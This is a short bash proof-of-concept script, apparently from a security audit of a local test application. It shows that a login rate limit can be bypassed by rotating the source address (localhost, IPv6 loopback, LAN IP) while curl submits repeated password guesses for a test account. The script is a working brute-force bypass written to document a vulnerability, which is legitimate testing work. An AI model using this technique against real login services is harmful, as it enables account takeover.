#!/usr/bin/env bash
# VULN-007 — PoC : la limite anti brute-force (5 essais / 15 min) se contourne en changeant d'IP
# Le serveur écoute sur toutes les interfaces : 127.0.0.1, ::1 et l'IP locale sont trois "clients".
source "$(dirname "$0")/../outils/common.sh"
setup_accounts

LAN_IP=$(ipconfig getifaddr en0 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')
n=0
for host in "127.0.0.1" "[::1]" "$LAN_IP"; do
  [ -z "$host" ] && continue
  echo "=== Depuis l'adresse $host"
  for i in 1 2 3 4 5 6; do
    n=$((n + 1))
    code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "http://$host:3099/auth/login" \
      -H 'Content-Type: application/json' -d "{\"email\":\"alice@corp.test\",\"password\":\"essai$n\"}")
    echo "  essai $n -> HTTP $code"
  done
done

echo
echo "=== Essais sur le compte d'Alice qui ont atteint la vérification du mot de passe (401) :"
echo "  attendu par la règle « 5 essais / 15 min » : 5"
